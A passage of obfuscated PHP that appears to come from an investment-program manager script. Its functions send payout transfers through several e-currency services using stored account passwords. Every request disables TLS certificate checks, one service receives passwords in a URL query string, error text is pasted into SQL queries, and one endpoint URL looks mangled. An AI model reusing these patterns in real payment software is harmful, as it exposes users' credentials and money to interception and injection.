      curl_setopt ($elnlcBPWUh, CURLOPT_POSTFIELDS, 'AccountID=' . rawurlencode ($elnlcTcyic[$elnlchyuw['elnlcvsTD']]) . '&PassPhrase=' . rawurlencode ($elnlcqajx) . '&Payee_Account=' . rawurlencode ($elnlcqdjux) . '&Amount=' . rawurlencode ($elnlcLiht) . '&PAY_IN=' . rawurlencode ($elnlcTcyic[$elnlchyuw['elnlcfSQvD']]) . ('' . '&WORTH_OF=Gold&Memo=' . $elnlcTBVVi . '&IGNORE_RATE_CHANGE=y'));
      curl_setopt ($elnlcBPWUh, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcBPWUh, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($elnlcBPWUh);
      curl_close ($elnlcBPWUh);
      $elnlcLDgi = array ();
      if (preg_match ('/<input type=hidden name=PAYMENT_BATCH_NUM VALUE="(\\d+)">/ims', $a, $elnlcLDgi))
      {
        return array (1, '', $elnlcLDgi[1]);
      }
      else
      {
        if (preg_match ('/<input type=hidden name=ERROR VALUE="(.*?)">/ims', $a, $elnlcLDgi))
        {
          $elnlctjzLV = preg_replace ('/&lt;/i', '<', $elnlcLDgi[1]);
          $elnlctjzLV = preg_replace ('/&gt;/i', '>', $elnlctjzLV);
          $e = elnlcekjci ('' . $elnlcuduiM . ' ' . $elnlctjzLV);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $elnlcuduiM . ('' . ' ' . $elnlctjzLV), '');
        }
        else
        {
          $e = elnlcekjci ('' . $elnlcuduiM . ' Unknown error');
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $elnlcuduiM . ' Unknown error', '');
        }
      }
    }
    else
    {
      $e = elnlcekjci ('' . $elnlcuduiM . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcuduiM . ' Curl functions are not available');
    }

  }

  function elnlculia ($elnlcFFkqn, $elnlcLiht, $elnlcqdjux, $elnlcTBVVi, $elnlcuduiM)
  {
    global $elnlchyuw;
    global $elnlcTcyic;
    if ($elnlcTcyic[$elnlchyuw['elnlcLdvMV']] == $elnlchyuw['elnlcoaeFK'])
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcTcyic[$elnlchyuw['elnlcFPiR']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcqdjux == '')
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to AlertPay account 0.\'';
      mysql_query ($q);
      return array (0, 'Invalid AlertPay account', '');
    }

    list ($elnlcojkk, $elnlcDrimo) = elnlcfeahv ($elnlcqdjux, 11);
    if ($elnlcojkk == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcDrimo . '\'';
      mysql_query ($q);
      return array (0, $elnlcDrimo);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlcFFkqn == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'alertpay_account_password\'';
        $elnlcTpvVW = mysql_query ($q);
        while ($elnlcgVDB = mysql_fetch_array ($elnlcTpvVW))
        {
          $elnlcgjnSA = elnlcaqvpp ($elnlcgVDB[$elnlchyuw['elnlcrWusB']], $elnlchyuw['elnlcpslqd']);
        }
      }
      else
      {
        $elnlcgjnSA = $elnlcFFkqn;
      }

      $elnlcBPWUh = curl_init ();
      $elnlcTBVVi = rawurlencode ($elnlcTBVVi);
      $elnlcxIcB = sprintf ('USER=%s&PASSWORD=%s&AMOUNT=%s&CURRENCY=%s&RECEIVEREMAIL=%s&SENDEREMAIL=%s&PURCHASETYPE=%s&NOTE=%s&TESTMODE=%s', urlencode ($elnlcTcyic[$elnlchyuw['elnlcjCnee']]), urlencode ($elnlcgjnSA), urlencode ($elnlcLiht), 'USD', urlencode ($elnlcqdjux), '', 0, urlencode ($elnlcTBVVi), 0);
      curl_setopt ($elnlcBPWUh, CURLOPT_URL, $elnlchyuw['elnlcRPqW']);
      curl_setopt ($elnlcBPWUh, CURLOPT_POST, true);
      curl_setopt ($elnlcBPWUh, CURLOPT_POSTFIELDS, $elnlcxIcB);
      curl_setopt ($elnlcBPWUh, CURLOPT_RETURNTRANSFER, true);
      curl_setopt ($elnlcBPWUh, CURLOPT_HEADER, false);
      curl_setopt ($elnlcBPWUh, CURLOPT_TIMEOUT, 30);
      curl_setopt ($elnlcBPWUh, CURLOPT_SSL_VERIFYPEER, false);
      $a = curl_exec ($elnlcBPWUh);
      curl_close ($elnlcBPWUh);
      parse_str (urldecode ($a), $elnlcgPMu);
      $elnlcLDgi = array ();
      if ($elnlcgPMu[$elnlchyuw['elnlcQcPv']] == 100)
      {
        return array (1, '', $elnlcgPMu[$elnlchyuw['elnlcNihMh']]);
      }
      else
      {
        if (200 < $elnlcgPMu[$elnlchyuw['elnlcQcPv']])
        {
          $elnlctjzLV = $elnlcgPMu[$elnlchyuw['elnlcQcPv']] . ': ' . $elnlcgPMu[$elnlchyuw['elnlcTvlAc']];
          $e = elnlcekjci ('' . $elnlcuduiM . ' ' . $elnlctjzLV);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $elnlcuduiM . ('' . ' ' . $elnlctjzLV), '');
        }
        else
        {
          $e = elnlcekjci ('' . $elnlcuduiM . ' Unknown error');
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $elnlcuduiM . ' Unknown error', '');
        }
      }
    }
    else
    {
      $e = elnlcekjci ('' . $elnlcuduiM . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcuduiM . ' Curl functions are not available');
    }

  }

  function elnlcqouj ($elnlcFFkqn, $elnlcLiht, $elnlcqdjux, $elnlcTBVVi, $elnlcuduiM)
  {
    global $elnlchyuw;
    global $elnlcTcyic;
    $elnlcLiht = sprintf ('%0.2f', floor ($elnlcLiht * 100) / 100);
    if ($elnlcTcyic[$elnlchyuw['elnlcFPiR']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcqdjux == 0)
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can not process withdrawal to Evocash account 0.\'';
      mysql_query ($q);
      return array (0, 'Invalid EvoCash account', '');
    }

    list ($elnlcojkk, $elnlcDrimo) = elnlcfeahv ($elnlcqdjux, 1);
    if ($elnlcojkk == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcDrimo . '\'';
      mysql_query ($q);
      return array (0, $elnlcDrimo);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlcFFkqn == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'evocash_account_password\'';
        $elnlcTpvVW = mysql_query ($q);
        while ($elnlcgVDB = mysql_fetch_array ($elnlcTpvVW))
        {
          $elnlchlpsV = elnlcaqvpp ($elnlcgVDB[$elnlchyuw['elnlcrWusB']], $elnlchyuw['elnlcpslqd']);
        }

        $q = 'select v from hm2_pay_settings where n=\'evocash_transaction_code\'';
        $elnlcTpvVW = mysql_query ($q);
        while ($elnlcgVDB = mysql_fetch_array ($elnlcTpvVW))
        {
          $elnlcOhMik = elnlcaqvpp ($elnlcgVDB[$elnlchyuw['elnlcrWusB']], $elnlchyuw['elnlcpslqd']);
        }
      }
      else
      {
        list ($elnlchlpsV, $elnlcOhMik) = preg_split ('/\\|/', $elnlcFFkqn);
      }

      $elnlcBPWUh = curl_init ();
      $elnlcTBVVi = rawurlencode ($elnlcTBVVi);
      curl_setopt ($elnlcBPWUh, CURLOPT_URL, 'https://www.evocash.com/evoswift/instantpayment.cfm?payingaccountid=' . rawurlencode ($elnlcTcyic[$elnlchyuw['elnlcxLeT']]) . '&username=' . rawurlencode ($elnlcTcyic[$elnlchyuw['elnlcIJxa']]) . '&password=' . rawurlencode ($elnlchlpsV) . '&transaction_code=' . rawurlencode ($elnlcOhMik) . '&amount=' . rawurlencode ($elnlcLiht) . ('' . '&reference=&memo=' . $elnlcTBVVi . '&receivingaccountid=') . rawurlencode ($elnlcqdjux) . '');
      curl_setopt ($elnlcBPWUh, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcBPWUh, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($elnlcBPWUh);
      curl_close ($elnlcBPWUh);
      $elnlcLDgi = array ();
      if (preg_match ('/<INPUT TYPE="Hidden" NAME="PayingTransactionID" VALUE="(.*?)">/ims', $a, $elnlcLDgi))
      {
        return array (1, '', $elnlcLDgi[1]);
      }
      else
      {
        if (preg_match ('/<INPUT TYPE="Hidden" NAME="Error" VALUE="(.*?)">/ims', $a, $elnlcLDgi))
        {
          $elnlctjzLV = $elnlcLDgi[1];
          $e = elnlcekjci ('' . $elnlcuduiM . ' ' . $elnlctjzLV);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $elnlcuduiM . ('' . ' ' . $elnlctjzLV), '');
        }
        else
        {
          $e = elnlcekjci ('' . $elnlcuduiM . ' Unknown error');
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $elnlcuduiM . ' Unknown error', '');
        }
      }
    }
    else
    {
      $e = elnlcekjci ('' . $elnlcuduiM . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcuduiM . ' Curl functions are not available');
    }

  }

  function elnlcawary ($elnlcFFkqn, $elnlcLiht, $elnlcqdjux, $elnlcTBVVi, $elnlcuduiM)
  {
    global $elnlchyuw;
    global $elnlcTcyic;
    if ($elnlcTcyic[$elnlchyuw['elnlcLdvMV']] == $elnlchyuw['elnlcoaeFK'])
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcTcyic[$elnlchyuw['elnlcFPiR']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcqdjux == 0)
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to IntGold account 0.\'';
      mysql_query ($q);
      return array (0, 'Invalid IntGold account', '');
    }

    list ($elnlcojkk, $elnlcDrimo) = elnlcfeahv ($elnlcqdjux, 2);
    if ($elnlcojkk == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcDrimo . '\'';
      mysql_query ($q);
      return array (0, $elnlcDrimo);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlcFFkqn == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'intgold_password\'';
        $elnlcTpvVW = mysql_query ($q);
        while ($elnlcgVDB = mysql_fetch_array ($elnlcTpvVW))
        {
          $elnlcRTAL = elnlcaqvpp ($elnlcgVDB[$elnlchyuw['elnlcrWusB']], $elnlchyuw['elnlcpslqd']);
        }
      }
      else
      {
        $elnlcRTAL = $elnlcFFkqn;
      }

      if ($elnlcFFkqn == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'intgold_password\'';
        $elnlcTpvVW = mysql_query ($q);
        while ($elnlcgVDB = mysql_fetch_array ($elnlcTpvVW))
        {
          $elnlcRTAL = elnlcaqvpp ($elnlcgVDB[$elnlchyuw['elnlcrWusB']], $elnlchyuw['elnlcpslqd']);
        }

        $q = 'select v from hm2_pay_settings where n=\'intgold_transaction_code\'';
        $elnlcTpvVW = mysql_query ($q);
        while ($elnlcgVDB = mysql_fetch_array ($elnlcTpvVW))
        {
          $elnlcAWDU = elnlcaqvpp ($elnlcgVDB[$elnlchyuw['elnlcrWusB']], $elnlchyuw['elnlcpslqd']);
        }
      }
      else
      {
        list ($elnlcRTAL, $elnlcAWDU) = preg_split ('/\\|/', $elnlcFFkqn);
      }

      $elnlcBPWUh = curl_init ();
      $elnlcTBVVi = rawurlencode ($elnlcTBVVi);
      curl_setopt ($elnlcBPWUh, CURLOPT_URL, 'https://intgold.com/cgi-bin/autopay.cgi');
      curl_setopt ($elnlcBPWUh, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcBPWUh, CURLOPT_POST, 1);
      curl_setopt ($elnlcBPWUh, CURLOPT_USERAGENT, 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)');
      curl_setopt ($elnlcBPWUh, CURLOPT_POSTFIELDS, 'ACCOUNTID=' . rawurlencode ($elnlcTcyic[$elnlchyuw['elnlcFTqoo']]) . '&PASSWORD=' . rawurlencode ($elnlcRTAL) . '&SECPASSWORD=' . rawurlencode ($elnlcAWDU) . '&RECEIVER=' . rawurlencode ($elnlcqdjux) . '&AMOUNT=' . rawurlencode ($elnlcLiht) . '&NOTE=' . $elnlcTBVVi);
      curl_setopt ($elnlcBPWUh, CURLOPT_RETURNTRANSFER, 1);
      curl_setopt ($elnlcBPWUh, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($elnlcBPWUh);
      curl_close ($elnlcBPWUh);
      $elnlcLDgi = array ();
      if (preg_match ('' . '/Success\\s*TRANSACTION_ID:(.*?)$/ims', $a, $elnlcLDgi))
      {
        return array (1, '', $elnlcLDgi[1]);
      }
      else
      {
        $e = elnlcekjci ('' . $elnlcuduiM . ' ' . $a);
        $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
        mysql_query ($q);
        return array (0, $elnlcuduiM . ('' . ' ' . $a), '');
      }
    }
    else
    {
      $e = elnlcekjci ('' . $elnlcuduiM . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcuduiM . ' Curl functions are not available');
    }

  }

  function elnlcuhqaw ($elnlcFFkqn, $elnlcLiht, $elnlcqdjux, $elnlcTBVVi, $elnlcuduiM)
  {
    global $elnlchyuw;
    global $elnlcTcyic;
    if ($elnlcTcyic[$elnlchyuw['elnlcLdvMV']] == $elnlchyuw['elnlcoaeFK'])
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcTcyic[$elnlchyuw['elnlcFPiR']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcqdjux == 0)
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to eeeCureency account 0.\'';
      mysql_query ($q);
      return array (0, 'Invalid eeeCurrency account', '');
    }

    list ($elnlcojkk, $elnlcDrimo) = elnlcfeahv ($elnlcqdjux, 8);
    if ($elnlcojkk == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcDrimo . '\'';
      mysql_query ($q);
      return array (0, $elnlcDrimo);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlcFFkqn == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'eeecurrency_password\'';
        $elnlcTpvVW = mysql_query ($q);
        while ($elnlcgVDB = mysql_fetch_array ($elnlcTpvVW))
        {
          $elnlcECAr = elnlcaqvpp ($elnlcgVDB[$elnlchyuw['elnlcrWusB']], $elnlchyuw['elnlcpslqd']);
        }

        $q = 'select v from hm2_pay_settings where n=\'eeecurrency_transaction_code\'';
        $elnlcTpvVW = mysql_query ($q);
        while ($elnlcgVDB = mysql_fetch_array ($elnlcTpvVW))
        {
          $elnlcuisuJ = elnlcaqvpp ($elnlcgVDB[$elnlchyuw['elnlcrWusB']], $elnlchyuw['elnlcpslqd']);
        }
      }
      else
      {
        list ($elnlcECAr, $elnlcuisuJ) = preg_split ('/\\|/', $elnlcFFkqn);
      }

      $elnlcBPWUh = curl_init ();
      $elnlcTBVVi = rawurlencode ($elnlcTBVVi);
      curl_setopt ($elnlcBPWUh, CURLOPT_URL, 'https://eeecurrency.com/cgi-bin/autopay.cgi');
      curl_setopt ($elnlcBPWUh, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcBPWUh, CURLOPT_POST, 1);
      curl_setopt ($elnlcBPWUh, CURLOPT_USERAGENT, 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)');
      curl_setopt ($elnlcBPWUh, CURLOPT_POSTFIELDS, 'ACCOUNTID=' . rawurlencode ($elnlcTcyic[$elnlchyuw['elnlccQkK']]) . '&PASSWORD=' . rawurlencode ($elnlcECAr) . '&SECPASSWORD=' . rawurlencode ($elnlcuisuJ) . '&RECEIVER=' . rawurlencode ($elnlcqdjux) . '&AMOUNT=' . rawurlencode ($elnlcLiht) . ('' . '&NOTE=' . $elnlcTBVVi));
      curl_setopt ($elnlcBPWUh, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($elnlcBPWUh);
      curl_close ($elnlcBPWUh);
      $elnlcLDgi = array ();
      if (preg_match ('' . '/Success\\s*TRANSACTION_ID:(.*?)$/ims', $a, $elnlcLDgi))
      {
        return array (1, '', $elnlcLDgi[1]);
      }
      else
      {
        $e = elnlcekjci ('' . $elnlcuduiM . ' ' . $a);
        $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
        mysql_query ($q);
        return array (0, $elnlcuduiM . ('' . ' ' . $a), '');
      }
    }
    else
    {
      $e = elnlcekjci ('' . $elnlcuduiM . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcuduiM . ' Curl functions are not available');
    }

  }

  function elnlcsvulm ($elnlcFFkqn, $elnlcLiht, $elnlcqdjux, $elnlcTBVVi, $elnlcuduiM)
  {
    global $elnlchyuw;
    global $elnlcTcyic;
    if ($elnlcTcyic[$elnlchyuw['elnlcLdvMV']] == $elnlchyuw['elnlcoaeFK'])
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcTcyic[$elnlchyuw['elnlcFPiR']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcqdjux == '')
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to empty Pecunix account.\'';
      mysql_query ($q);
      return array (0, 'Invalid Pecunix account', '');
    }

    list ($elnlcojkk, $elnlcDrimo) = elnlcfeahv ($elnlcqdjux, 9);
    if ($elnlcojkk == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcDrimo . '\'';
      mysql_query ($q);
      return array (0, $elnlcDrimo);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlcFFkqn == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'pecunix_password\'';
        $elnlcTpvVW = mysql_query ($q);
        while ($elnlcgVDB = mysql_fetch_array ($elnlcTpvVW))
        {
          $elnlcESQpp = elnlcaqvpp ($elnlcgVDB[$elnlchyuw['elnlcrWusB']], $elnlchyuw['elnlcpslqd']);
        }
      }
      else
      {
        $elnlcESQpp = $elnlcFFkqn;
      }

      $elnlcBPWUh = curl_init ();
      $elnlcSTPT = elnlciixa ('{px_time}');
      $elnlcPJTW = strtoupper (md5 ($elnlcESQpp . ':' . $elnlcSTPT));
      $elnlcxIcB = '
    <TransferRequest>
      <Transfer>
        <TransferId> </TransferId>
        <Payer> ' . htmlentities ($elnlcTcyic[$elnlchyuw['elnlcrxMAD']], ENT_NOQUOTES) . ' </Payer>
        <Payee> ' . htmlentities ($elnlcqdjux, ENT_NOQUOTES) . ' </Payee>
        <CurrencyId> GAU </CurrencyId>
        <Equivalent>
          <CurrencyId> USD </CurrencyId>
          <Amount> ' . htmlentities ($elnlcLiht, ENT_NOQUOTES) . ' </Amount>
        </Equivalent>
        <FeePaidBy> Payee </FeePaidBy>
        <Memo> ' . htmlentities ($elnlcTBVVi, ENT_NOQUOTES) . ('' . ' </Memo>
      </Transfer>
      <Auth>
        <Token> ' . $elnlcPJTW . ' </Token>
      </Auth>
    </TransferRequest>
    ');
      $elnlcBPWUh = curl_init ();
      curl_setopt ($elnlcBPWUh, CURLOPT_URL, 'https://pxi.pecunix.com/money.refined...transfer');
      curl_setopt ($elnlcBPWUh, CURLOPT_POST, 1);
      curl_setopt ($elnlcBPWUh, CURLOPT_POSTFIELDS, $elnlcxIcB);
      curl_setopt ($elnlcBPWUh, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcBPWUh, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($elnlcBPWUh);
      curl_close ($elnlcBPWUh);
      $elnlcpSub = elnlcnhxn ($a);
      if ($elnlcpSub[$elnlchyuw['elnlcMnIrp']] == $elnlchyuw['elnlcuQOep'])
      {
        return array (1, '', $elnlcpSub[$elnlchyuw['elnlcDPJw']]);
      }
      else
      {
        if ($elnlcpSub[$elnlchyuw['elnlcMnIrp']] == $elnlchyuw['elnlcbULGC'])
        {
          $e = elnlcekjci ('' . $elnlcuduiM . ' ' . $elnlcpSub[$elnlchyuw['elnlcSbHgw']] . ' ' . $elnlcpSub[$elnlchyuw['elnlcjCrb']]);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $e, '');
        }
        else
        {
          $e = elnlcekjci ('' . $elnlcuduiM . ' Parse error: ' . $a);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $e, '');
        }
      }
    }
    else
    {
      $e = elnlcekjci ('' . $elnlcuduiM . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcuduiM . ' Curl functions are not available');
    }

  }

  function elnlcnovw ($elnlcFFkqn, $elnlcLiht, $elnlcqdjux, $elnlcTBVVi, $elnlcuduiM)
  {
    global $elnlchyuw;
    global $elnlcTcyic;
    if ($elnlcTcyic[$elnlchyuw['elnlcLdvMV']] == $elnlchyuw['elnlcoaeFK'])
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcTcyic[$elnlchyuw['elnlcFPiR']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcqdjux == '')
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to empty LibertyReserve account.\'';
      mysql_query ($q);
      return array (0, 'Invalid LibertyReserve account', '');
    }

    list ($elnlcojkk, $elnlcDrimo) = elnlcfeahv ($elnlcqdjux, 15);
    if ($elnlcojkk == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcDrimo . '\'';
      mysql_query ($q);
      return array (0, $elnlcDrimo);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlcFFkqn == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'libertyreserve_password\'';
        $elnlcTpvVW = mysql_query ($q);
        while ($elnlcgVDB = mysql_fetch_array ($elnlcTpvVW))
        {
          $elnlcATtsd = elnlcaqvpp ($elnlcgVDB[$elnlchyuw['elnlcrWusB']], $elnlchyuw['elnlcpslqd']);
        }

        $elnlcOhlvt = $elnlcTcyic[$elnlchyuw['elnlcxNaw']];
      }
      else
      {
        list ($elnlcATtsd, $elnlcOhlvt) = preg_split ('/\\|/', $elnlcFFkqn);
      }

      $elnlcBPWUh = curl_init ();
      $elnlcPJTW = strtoupper (elnlciixa ($elnlcATtsd . ':{lr_time}'));
      $elnlcxIcB = '<TransferRequest id="' . rand (1000000, 9999999) . '">
  <Auth>
    <ApiName>' . htmlspecialchars ($elnlcOhlvt) . ('' . '</ApiName>
    <Token>' . $elnlcPJTW . '</Token>
  </Auth>
  <Transfer>
    <TransferType>transfer</TransferType>
    <Payer>') . htmlentities ($elnlcTcyic[$elnlchyuw['elnlcqrBq']], ENT_NOQUOTES) . '</Payer>
    <Payee>' . htmlentities ($elnlcqdjux, ENT_NOQUOTES) . '</Payee>
    <CurrencyId>' . htmlentities ($elnlcTcyic[$elnlchyuw['elnlcyhPRM']]) . '</CurrencyId>
    <Amount>' . htmlentities ($elnlcLiht, ENT_NOQUOTES) . '</Amount>
    <Memo>' . htmlentities ($elnlcTBVVi, ENT_NOQUOTES) . '</Memo>
    <Anonymous>false</Anonymous>
  </Transfer>
</TransferRequest>';
      $elnlcBPWUh = curl_init ();
      curl_setopt ($elnlcBPWUh, CURLOPT_URL, 'https://api.libertyreserve.com/xml/transfer.aspx?req=' . urlencode ($elnlcxIcB));
      curl_setopt ($elnlcBPWUh, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcBPWUh, CURLOPT_RETURNTRANSFER, 1);
      $elnlcNNiM = array ('User-Agent: Mozilla/5.0');
      curl_setopt ($elnlcBPWUh, CURLOPT_HTTPHEADER, $elnlcNNiM);
      $a = curl_exec ($elnlcBPWUh);
      curl_close ($elnlcBPWUh);
      $elnlcTcyic[$elnlchyuw['elnlcWWRto']] = $elnlcxIcB;
      $elnlcTcyic[$elnlchyuw['elnlcLQcG']] = $a;
      $elnlcpSub = elnlcqfgi ($a);
      if ($elnlcpSub[$elnlchyuw['elnlcMnIrp']] == $elnlchyuw['elnlcuQOep'])
      {
        return array (1, '', $elnlcpSub[$elnlchyuw['elnlcDPJw']]);
      }
      else
      {
        if ($elnlcpSub[$elnlchyuw['elnlcMnIrp']] == $elnlchyuw['elnlcbULGC'])
        {
          $e = elnlcekjci ('' . $elnlcuduiM . ' ' . $elnlcpSub[$elnlchyuw['elnlcSbHgw']] . '<br>' . $elnlcpSub[$elnlchyuw['elnlcjCrb']]);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $e, '');
        }
        else
        {
          $e = elnlcekjci ('' . $elnlcuduiM . ' Parse error: ' . $a);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $e, '');
        }
      }
    }
    else
    {
      $e = elnlcekjci ('' . $elnlcuduiM . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcuduiM . ' Curl functions are not available');
    }

  }

  function elnlcvwrkl ($elnlcFFkqn, $elnlcLiht, $elnlcqdjux, $elnlcTBVVi, $elnlcuduiM)
  {
    global $elnlchyuw;
    global $elnlcTcyic;
    if ($elnlcTcyic[$elnlchyuw['elnlcLdvMV']] == $elnlchyuw['elnlcoaeFK'])
    {
    }

    if ($elnlcTcyic[$elnlchyuw['elnlcFPiR']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcqdjux == '')
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to empty V-Money account.\'';
      mysql_query ($q);
      return array (0, 'Invalid V-Money account', '');
    }

    list ($elnlcojkk, $elnlcDrimo) = elnlcfeahv ($elnlcqdjux, 16);
    if ($elnlcojkk == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcDrimo . '\'';
      mysql_query ($q);
      return array (0, $elnlcDrimo);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlcFFkqn == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'vmoney_password\'';
        $elnlcTpvVW = mysql_query ($q);
        while ($elnlcgVDB = mysql_fetch_array ($elnlcTpvVW))
        {
          $elnlcWIOx = elnlcaqvpp ($elnlcgVDB[$elnlchyuw['elnlcrWusB']], $elnlchyuw['elnlcpslqd']);
        }
      }
      else
      {
        $elnlcWIOx = $elnlcFFkqn;
      }

      $elnlcPJTW = md5 ($elnlcTcyic[$elnlchyuw['elnlcBeUr']] . $elnlcWIOx . elnlciixa ('{vm_time}'));
      $elnlcxIcB = '<Request>
	<Type>Transfer</Type>
	<Auth>
		<AccountId>' . htmlentities ($elnlcTcyic[$elnlchyuw['elnlcBeUr']], ENT_NOQUOTES) . ('' . '</AccountId>
		<Token>' . $elnlcPJTW . '</Token>
	</Auth>
	<Transfers>
		<Transfer>
			<ID>1</ID>
			<Payee>') . htmlentities ($elnlcqdjux, ENT_NOQUOTES) . '</Payee>
			<Amount>' . htmlentities ($elnlcLiht, ENT_NOQUOTES) . '</Amount>
			<Memo>' . htmlentities ($elnlcTBVVi, ENT_NOQUOTES) . '</Memo>
		</Transfer>
	</Transfers>
        </Request>';
      $elnlcBPWUh = curl_init ();
      curl_setopt ($elnlcBPWUh, CURLOPT_URL, 'https://www.v-money.net/vai.php');
      curl_setopt ($elnlcBPWUh, CURLOPT_POST, 1);
      curl_setopt ($elnlcBPWUh, CURLOPT_POSTFIELDS, 'request_data=' . $elnlcxIcB);
      curl_setopt ($elnlcBPWUh, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcBPWUh, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($elnlcBPWUh);
      curl_close ($elnlcBPWUh);
      $elnlcpSub = elnlcvnzv ($a);
      if ($elnlcpSub[$elnlchyuw['elnlcMnIrp']] == $elnlchyuw['elnlcuQOep'])
      {
        return array (1, '', $elnlcpSub[$elnlchyuw['elnlcDPJw']]);
      }
      else
      {
        if ($elnlcpSub[$elnlchyuw['elnlcMnIrp']] == $elnlchyuw['elnlcbULGC'])
        {
          $e = elnlcekjci ('' . $elnlcuduiM . ' ' . $elnlcpSub[$elnlchyuw['elnlcSbHgw']]);
